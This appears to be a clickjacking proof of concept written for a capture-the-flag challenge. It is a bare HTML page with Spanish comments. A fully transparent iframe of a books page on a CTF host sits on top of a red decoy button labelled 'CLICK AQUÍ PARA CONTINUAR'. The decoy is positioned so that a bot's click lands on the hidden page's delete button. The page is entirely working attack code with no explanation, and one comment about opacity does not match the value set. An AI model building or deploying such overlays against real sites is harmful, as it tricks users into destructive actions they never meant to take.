<!DOCTYPE html>
<html>
<head>
    <title>Soporte Técnico - Books</title>
    <style>
        body { margin: 0; padding: 0; font-family: sans-serif; }
        
        .wrapper { position: relative; width: 100%; height: 100vh; }

        /* El botón invisible que el bot buscará por ID */
        #objetivo {
            position: absolute;
            z-index: 1;
            /* Basado en el HTML, el botón de borrar está al final */
            top: 920px; 
            left: 50%;
            transform: translateX(-50%);
            width: 300px;
            height: 60px;
            cursor: pointer;
            background: red;
            border: none;
            color: white;
        }

        /* La web del libro cargada encima */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1200px; /* Un poco más alto para asegurar scroll */
            border: none;
            z-index: 2;
            /* AJUSTE: Empieza en 0.5 para ver si coincide el botón rojo con el de la web */
            opacity: 0; 
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <button id="objetivo">CLICK AQUÍ PARA CONTINUAR</button>

        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

</body>
</html>
